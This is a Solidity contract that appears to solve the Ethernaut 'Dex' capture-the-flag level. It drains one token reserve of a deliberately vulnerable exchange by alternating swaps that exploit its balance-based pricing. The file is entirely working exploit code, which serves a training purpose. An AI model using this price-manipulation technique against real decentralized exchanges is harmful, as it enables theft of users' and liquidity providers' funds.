// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(address from, address to, uint256 amount) external;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);
}

/*
 * Attacker contract for Ethernaut Dex level.
 *
 * The EOA calls attack():
 * 1. Pulls player's tokens into this contract
 * 2. Manipulates price by alternating swaps
 * 3. Drains one reserve of the Dex
 * 4. Sends all tokens back to msg.sender
 */
contract DexAttacker {
    IDex public dex;
    IERC20 public token1;
    IERC20 public token2;

    constructor(address dexAddr) {
        dex = IDex(dexAddr);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());

        // Give Dex unlimited allowance from this contract
        token1.approve(dexAddr, type(uint256).max);
        token2.approve(dexAddr, type(uint256).max);
    }

    function attack() external {
        address player = msg.sender;

        // ---- Step 1: pull player's tokens into attacker contract ----

        uint256 p1 = token1.balanceOf(player);
        uint256 p2 = token2.balanceOf(player);

        require(
            token1.transferFrom(player, address(this), p1),
            "pull token1 failed"
        );
        require(
            token2.transferFrom(player, address(this), p2),
            "pull token2 failed"
        );

        // ---- Step 2: manipulate price and drain Dex ----

        while (
            token1.balanceOf(address(dex)) > 0 &&
            token2.balanceOf(address(dex)) > 0
        ) {
            uint256 my1 = token1.balanceOf(address(this));
            uint256 my2 = token2.balanceOf(address(this));

            if (my1 > 0) {
                _swapMax(address(token1), address(token2), my1);
            } else if (my2 > 0) {
                _swapMax(address(token2), address(token1), my2);
            } else {
                break;
            }
        }

        // ---- Step 3: send all tokens back to player ----

        uint256 final1 = token1.balanceOf(address(this));
        uint256 final2 = token2.balanceOf(address(this));

        if (final1 > 0) token1.transfer(player, final1);
        if (final2 > 0) token2.transfer(player, final2);
    }

    /*
     * Swap as much as possible, but cap input to avoid revert
     * when Dex does not have enough output tokens.
     */
    function _swapMax(address from, address to, uint256 amount) internal {
        uint256 dexToBalance = IERC20(to).balanceOf(address(dex));
        uint256 expectedOut = dex.getSwapPrice(from, to, amount);

        if (expectedOut > dexToBalance) {
            // To drain Dex completely:
            // out = in * reserveOut / reserveIn
            // want out == reserveOut
            // => in == reserveIn
            uint256 dexFromBalance = IERC20(from).balanceOf(address(dex));
            dex.swap(from, to, dexFromBalance);
        } else {
            dex.swap(from, to, amount);
        }
    }
}
